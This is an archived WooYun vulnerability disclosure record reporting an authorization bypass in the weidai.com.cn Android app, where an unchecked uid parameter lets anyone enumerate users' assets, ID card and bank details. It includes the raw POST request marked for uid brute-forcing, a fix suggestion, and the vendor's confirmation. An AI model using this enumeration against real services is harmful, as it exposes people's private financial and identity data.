{"id": 81422, "wybug_id": "wooyun-2015-0153720", "wybug_title": "P2P微贷网高危漏洞可对所有在线用户资产身份证银行数据遍历", "wybug_corp": "weidai.com.cn", "wybug_author": "慢跑", "wybug_date": "2015-12-30 09:35", "wybug_open_date": "2015-12-26 10:36", "wybug_type": "未授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-26：\t细节向公众公开  简要描述： P2P微贷网高危漏洞可对所有在线用户资产身份证银行数据遍历 详细说明：  微贷网android app---我的资产请求参数uid未做token或身份校验，导致越权漏洞，通过编辑uid字典可以遍历爬取所有在线用户资产及用户实名身份证及银行信息1、注册登陆微贷网android app  进入我的资产2、将请求包中得uid作为变量进行资产遍历，使用1-500000的数字作为字典\nPOST /user/accInfo HTTP/1.1Content-Type: application/x-www-form-urlencodedContent-Length: 83Host: m.weidai.com.cnConnection: Keep-AliveUser-Agent: Apache-HttpClient/UNAVAILABLE (java 1.5)Cookie: JSESSIONID=DB9EF2B75A781C0601A7365837A1C6C1; SERVERID=34d40cbb96cc3f15549eed6dcc2675d1|1447251024|1447251004Cookie2: $Version=1at=b78d575a3c1cfc4169ee538165984ac2&uid=§111§&sid=5f2fee66c83d7b1627406c76c8\n3、可以遍历出来所有在线用户资产\n\n   漏洞证明：  1、任意选择一个uid=2489获取如下数据\n\n2、进入账户设置可以获取实名认证的身份证银行数据\n\n   修复方案：  增加token限制或请求身份校验   版权声明：转载请注明来源 慢跑@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：16  确认时间：2015-12-30 09:53 厂商回复： 感谢慢跑对于贵公司产品的安全帮助，贵司马上组织技术修复。请持续保持联系。谢谢 最新状态： 2016-01-12：已经修复  ", "replys": "漏洞评价：\n评价\n     2015-12-30 10:04 |    \t\tmagina \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 并没有任何好介绍的)\t\t \n  不是应该自称我司么。。。    \n     2015-12-30 10:22 |    \t\t微贷网(乌云厂商)\t\t \n  @magina 码字太快，又出现了一个bug。惭愧哈哈    \n     2015-12-30 14:10 |    \t\t夏殇 \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:22        | 不忘初心，方得始终。)\t\t \n  分数挺高的o_O    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 16, "Ranks": null}